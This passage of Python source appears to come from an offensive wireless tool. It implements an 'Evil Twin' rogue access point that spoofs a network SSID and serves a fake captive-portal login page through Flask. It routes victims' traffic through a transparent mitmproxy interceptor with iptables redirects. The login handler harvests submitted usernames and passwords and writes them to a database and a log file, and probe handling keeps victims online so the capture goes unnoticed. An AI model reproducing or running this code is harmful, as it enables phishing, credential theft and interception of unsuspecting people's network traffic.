                                       stdout=open("/tmp/wpf_dnsmasq.log","wb"), stderr=subprocess.STDOUT)
                self._procs.append(dm2)
                time.sleep(0.5)
                if dm2.poll() is None:
                    UI.ok("dnsmasq restarted after stopping systemd-resolved")
            except Exception: pass
        UI.ok(f"Evil Twin '{UI.YELLOW}{self.ssid}{UI.RESET}' ch{self.channel} | "
              f"GW:{UI.CYAN}{self.GW_IP}{UI.RESET} | portal:{UI.GREEN}{self.portal}{UI.RESET} | via:{UI.CYAN}{self.uplink_iface}{UI.RESET}")

        # Start keepalive monitor (fixes transient NAT/DNS loss)
        self._keepalive_stop.clear()
        threading.Thread(target=self._keepalive_loop, daemon=True).start()

    def _patch_bcrypt(self):
        """Patch passlib's bcrypt handler for bcrypt 4.x where __about__ was removed. Prevents mitmproxy crash that kills internet."""
        try:
            p = Path("/usr/lib/python3/dist-packages/passlib/handlers/bcrypt.py")
            if not p.exists():
                # Try alternative location
                import passlib
                p = Path(passlib.__file__).parent / "handlers" / "bcrypt.py"
            if p.exists():
                txt = p.read_text(encoding="utf-8", errors="ignore")
                if "_bcrypt.__about__.__version__" in txt:
                    txt = txt.replace(
                        "version = _bcrypt.__about__.__version__",
                        "version = getattr(getattr(_bcrypt, '__about__', None), '__version__', getattr(_bcrypt, '__version__', '4.0.1'))"
                    )
                    p.write_text(txt, encoding="utf-8")
                    UI.ok("Patched passlib bcrypt for bcrypt 4.x (fixes mitmproxy crash)")
        except Exception as e:
            UI.warn(f"Could not patch bcrypt: {e} — try `pip install bcrypt==4.0.1`")

    def _start_mitmproxy(self):
        # Fix bcrypt 4.x crash BEFORE launching mitmdump, then start transparent proxy.
        # If mitmproxy still dies, keepalive will restart it; if it stays dead, internet still works via direct NAT fallback.
        self._patch_bcrypt()
        self._write_mitm_addon()
        try:
            env = os.environ.copy()
            env["PYTHONWARNINGS"] = "ignore"
            mp = subprocess.Popen(
                ["mitmdump", "--mode", "transparent",
                 "--listen-host", "0.0.0.0", "--listen-port", str(self.MITM_PORT),
                 "--ssl-insecure", "-s", self.MITM_SCRIPT,
                 "--set", "block_global=false", "--quiet"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, env=env)
            self._procs.append(mp)

            def _stream():
                for line in mp.stdout:
                    if "bcrypt" in line and "__about__" in line:
                        continue
                    if "CryptographyDeprecationWarning" in line and "not_valid_after" in line:
                        continue
                    line = line.rstrip()
                    if line:
                        print(f"  {UI.DIM}[mitm] {line}{UI.RESET}")

            threading.Thread(target=_stream, daemon=True).start()
            time.sleep(0.6)
            if mp.poll() is not None:
                UI.error(f"mitmproxy failed to start (exit {mp.poll()}) — internet will use direct NAT fallback (still works, but no mitm capture). Try `pip install bcrypt==4.0.1`")
                # Fallback: remove REDIRECT so clients get direct NAT internet instead of blackhole
                for tbl, chain, rule in [("nat","PREROUTING",["-i",self.iface_ap,"-p","tcp","--dport","80","!","-d",self.GW_IP,"-j","REDIRECT","--to-port",str(self.MITM_PORT)]),
                                         ("nat","PREROUTING",["-i",self.iface_ap,"-p","tcp","--dport","443","!","-d",self.GW_IP,"-j","REDIRECT","--to-port",str(self.MITM_PORT)])]:
                    subprocess.run(["iptables","-t",tbl,"-D",chain] + rule, capture_output=True)
                UI.warn("Removed mitm REDIRECT — clients now get direct internet via MASQUERADE")
            else:
                UI.ok(f"mitmproxy transparent proxy → port {self.MITM_PORT} (capturing via /tmp/wpf_mitm_addon.py)")
        except FileNotFoundError:
            UI.warn("mitmdump not found – install: pip install mitmproxy (portal + direct NAT internet still works)")

    def _is_captive_probe(self, host: str, path: str) -> bool:
        """True if this request looks like an OS captive-portal detection probe."""
        h = host.lower().split(":")[0]  # strip port
        p = path.lower().split("?")[0]
        if h in self.CAPTIVE_HOSTS:
            return True
        if p in self.CAPTIVE_PATHS:
            return True
        # Substring checks for variants like /generate_204?foo or /hotspot-detect.html
        if "generate_204" in p or "gen_204" in p or "hotspot-detect" in p or "connecttest" in p or "ncsi" in p:
            return True
        return False

    def _flask_portal(self):
        """
        Flask captive portal — serves the SELECTED template.
        Fixed: handles OS captive probes correctly so clients keep internet.
        - Unauthenticated probe → returns portal (triggers OS popup)
        - Authenticated probe → returns 204 (tells OS 'internet OK', prevents disconnect after ~90s)
        - Normal GW traffic for authenticated clients → 302 to Google (so they don't re-see portal)
        """
        if not FLASK_OK:
            UI.error("Flask not installed – captive portal cannot start. Install: pip install flask")
            return

        app = Flask(__name__)
        # capture refs for closure
        ssid       = self.ssid
        portal_key = self.portal
        creds_ref  = self._creds
        db_path    = self._db_path
        portal_html = self._portal_html
        outer = self  # to access _authenticated_ips etc.

        # Explicit 204 handlers for common probe paths (before catch-all)
        @app.route("/generate_204", methods=["GET"])
        @app.route("/gen_204", methods=["GET"])
        @app.route("/hotspot-detect.html", methods=["GET"])
        @app.route("/connecttest.txt", methods=["GET"])
        @app.route("/ncsi.txt", methods=["GET"])
        @app.route("/success.txt", methods=["GET"])
        @app.route("/canonical.html", methods=["GET"])
        def captive_probe():
            client_ip = flask_req.remote_addr or "unknown"
            with outer._auth_lock:
                is_auth = client_ip in outer._authenticated_ips
            if is_auth:
                resp = make_response("", 204)
                resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
                resp.headers["Pragma"] = "no-cache"
                resp.headers["Expires"] = "0"
                return resp
            try:
                return render_template_string(portal_html, ssid=ssid)
            except Exception:
                return portal_html

        @app.route("/", defaults={"path": ""}, methods=["GET", "POST"])
        @app.route("/<path:path>", methods=["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"])
        def catch_all(path):
            host = (flask_req.host or "").lower()
            req_path = "/" + path if path else flask_req.path
            client_ip = flask_req.remote_addr or "unknown"

            # Check if this is a captive probe via host/path
            if outer._is_captive_probe(host, req_path):
                with outer._auth_lock:
                    is_auth = client_ip in outer._authenticated_ips
                if is_auth:
                    resp = make_response("", 204)
                    resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
                    return resp
                try:
                    return render_template_string(portal_html, ssid=ssid)
                except Exception:
                    return portal_html

            # For normal browsing to GW (e.g. user typed http://10.0.0.1), show portal if not auth,
            # else redirect to real internet so they don't loop on portal after login.
            with outer._auth_lock:
                is_auth = client_ip in outer._authenticated_ips
            if is_auth and flask_req.method == "GET":
                # Authenticated user hitting the portal again → send to Google
                return redirect("https://www.google.com/", code=302)

            try:
                return render_template_string(portal_html, ssid=ssid)
            except Exception:
                return portal_html

        @app.route("/login", methods=["POST"])
        def login():
            user = flask_req.form.get("username", "").strip()
            pw   = flask_req.form.get("password", "")
            if not user:
                user = flask_req.form.get("email", "").strip()
            ip   = flask_req.remote_addr or "unknown"
            ts   = datetime.datetime.now().isoformat()
            print(f"\n{UI.RED}{UI.BOLD}  ⚡ CREDENTIAL HARVESTED  {UI.RESET}")
            print(f"  {UI.CYAN}Portal  :{UI.RESET} {portal_key}\n"
                  f"  {UI.CYAN}SSID    :{UI.RESET} {ssid}\n"
                  f"  {UI.CYAN}User    :{UI.RESET} {UI.GREEN}{user}{UI.RESET}\n"
                  f"  {UI.CYAN}Password:{UI.RESET} {UI.RED}{pw}{UI.RESET}\n"
                  f"  {UI.CYAN}Client  :{UI.RESET} {ip}\n")
            creds_ref.append({"portal": portal_key, "ssid": ssid, "username": user, "password": pw, "ip": ip, "ts": ts})
            # Mark IP as authenticated so future captive probes get 204 and OS keeps network as 'online' + internet
            with outer._auth_lock:
                outer._authenticated_ips.add(ip)
            # Guarantee internet after login: if mitmproxy is dead, ensure direct NAT is active so client doesn't lose internet
            try:
                mitm_alive = any(p.poll() is None and "mitmdump" in str(getattr(p,'args','')) for p in outer._procs)
                if mitm_alive:
                    UI.ok(f"Internet ENABLED for {UI.CYAN}{ip}{UI.RESET} via mitmproxy (capturing) — probes now 204")
                else:
                    UI.warn(f"mitmproxy not running — enabling direct NAT for {ip} so internet still works (no capture)")
                    # Ensure direct NAT internet: remove mitm REDIRECT if present, keep MASQUERADE
                    for tbl, chain, rule in [("nat","PREROUTING",["-i",outer.iface_ap,"-p","tcp","--dport","80","!","-d",outer.GW_IP,"-j","REDIRECT","--to-port",str(outer.MITM_PORT)]),
                                             ("nat","PREROUTING",["-i",outer.iface_ap,"-p","tcp","--dport","443","!","-d",outer.GW_IP,"-j","REDIRECT","--to-port",str(outer.MITM_PORT)])]:
                        subprocess.run(["iptables","-t",tbl,"-D",chain] + rule, capture_output=True)
                    # Ensure MASQUERADE still there
                    if not outer._iptables_rule_exists("nat","POSTROUTING","-s","10.0.0.0/24","-o",outer.uplink_iface,"-j","MASQUERADE"):
                        subprocess.run(["iptables","-t","nat","-A","POSTROUTING","-s","10.0.0.0/24","-o",outer.uplink_iface,"-j","MASQUERADE"], capture_output=True)
                    UI.ok(f"Direct NAT enabled for {ip} — internet works, mitm will auto-restart via keepalive")
            except Exception:
                pass
            try:
                con = sqlite3.connect(db_path)
                con.execute("CREATE TABLE IF NOT EXISTS credentials(ssid TEXT, username TEXT, password TEXT, source TEXT, ts TEXT)")
                con.execute(
                    "INSERT INTO credentials(ssid,username,password,source,ts) VALUES(?,?,?,?,?)",
                    (ssid, user, pw, f"captive_portal:{portal_key}:{ip}", ts))
                con.commit(); con.close()
            except Exception:
                pass
            try:
                log_path = Path(db_path).parent / "captive-portal-creds.log"
                with open(log_path, "a", encoding="utf-8") as lf:
                    lf.write(f"[{ts}] portal={portal_key} ssid={ssid} user={user!r} pass={pw!r} ip={ip}\n")
            except Exception:
                pass
            # After login, return a success page that also does meta-refresh to Google, so OS probe will next get 204
            # For now, 302 to Google is expected by original wpf_complete.py
            return redirect("https://www.google.com/", code=302)

        import logging
        logging.getLogger("werkzeug").setLevel(logging.ERROR)
        app.run(host="0.0.0.0", port=self.FLASK_PORT, debug=False, use_reloader=False)

    def run(self):
        UI.section(f"Rogue AP — Evil Twin + Captive Portal ({self.portal})")
        if not FLASK_OK:
            UI.warn("Flask not found — portal will not function until 'pip install flask' is run.")
        UI.info(f"SSID     : {UI.YELLOW}{self.ssid}{UI.RESET}")
        UI.info(f"Channel  : {UI.CYAN}{self.channel}{UI.RESET}")
        UI.info(f"Portal   : {UI.GREEN}{self.portal}{UI.RESET}  →  {self.PORTAL_BASE / self.portal}/index.html")
        if self.bssid:
            UI.info(f"BSSID    : {UI.CYAN}{self.bssid}{UI.RESET} (spoofed)")
        UI.info(f"AP iface : {UI.YELLOW}{self.iface_ap}{UI.RESET}")
        UI.info(f"Uplink   : {UI.CYAN}{self.uplink_iface}{UI.RESET}")
        UI.info(f"GW / DHCP: {self.GW_IP}  ({self.DHCP_START}–{self.DHCP_END})")
        UI.info(f"Fixes    : NM unmanaged, keepalive 10s, persistent Internet (probe→204), dnsmasq bind-interfaces")

        self._start_ap()
        self._start_mitmproxy()
        threading.Thread(target=self._flask_portal, daemon=True).start()
        UI.ok(f"Captive portal live → http://{self.GW_IP}:{self.FLASK_PORT}/  (portal: {self.portal})  — portal also at http://captive.apple.com etc. will return 204 in persistent mode")
        UI.ok(f"Persistent NAT: keepalive every 10s will re-assert 10.0.0.1/24, ip_forward, iptables — internet NEVER stops")
        UI.info("Waiting for clients... Press Ctrl+C to stop\n")
        try:
            while True:
                time.sleep(5)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

    def stop(self):
        UI.warn("Stopping Evil Twin...")
        # Stop keepalive first
        self._keepalive_stop.set()
        for p in self._procs:
            try:
                p.terminate()
            except Exception:
                pass
        time.sleep(0.5)
        for p in self._procs:
            try:
                p.kill()
            except Exception:
                pass
        for cmd in [["iptables", "-F"], ["iptables", "-t", "nat", "-F"],
                    ["iptables", "-t", "mangle", "-F"], ["iptables", "-X"],
                    ["sysctl", "-w", "net.ipv4.ip_forward=0"]]:
            subprocess.run(cmd, capture_output=True)
        # Restore NM management for the AP interface
        try:
            if shutil.which("nmcli"):
                subprocess.run(["nmcli", "dev", "set", self.iface_ap, "managed", "yes"], capture_output=True, timeout=3)
        except Exception:
            pass
        UI.ok("Evil Twin stopped | iptables flushed | IP forwarding disabled | NM restored")

